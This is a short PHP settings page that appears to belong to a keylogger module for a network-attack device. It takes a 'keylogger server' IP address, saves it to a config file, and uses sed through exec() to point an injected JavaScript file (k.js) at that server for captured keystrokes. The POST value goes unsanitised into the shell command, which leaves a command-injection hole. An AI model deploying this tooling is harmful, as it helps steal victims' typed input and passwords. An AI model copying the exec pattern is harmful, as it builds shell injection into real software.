<?php

require("keylogger_vars.php");

if (isset($_GET['get_conf']))
{
	$configArray = explode("\n", trim(file_get_contents($module_path."keylogger.conf")));
	
	echo "<form id='form_conf'>";
	echo "<input type='hidden' name='set_conf'/>";
	echo "Keylogger Server IP Address:Port (e.g. 172.16.42.1)&nbsp;";
	echo '<input type="text" id="keylogger_hook" name="keylogger_hook" value="'.$keylogger_hook_ip.'" size="25"><br/><br/>';
	echo '<em>Note: Keylogger has to be re-installed if configuration is changed.</em>';
	echo "</form>";
}

if (isset($_POST['set_conf']))
{
	if (isset($_POST['keylogger_hook']))
	{
		$keylogger_hook_ip = $_POST['keylogger_hook'];
		
		$filename = $module_path."keylogger.conf";

		$newdata = "ip=".$keylogger_hook_ip;
		$newdata = ereg_replace(13,  "", $newdata);
		$fw = fopen($filename, 'w');
		$fb = fwrite($fw,stripslashes($newdata));
		fclose($fw);

		exec("sed -i \"s/var server = \(.*\)/var server = \\\"http:\/\/".$keylogger_hook_ip."\\\"/g\" ".$module_path."k.js");
	}
}
?>
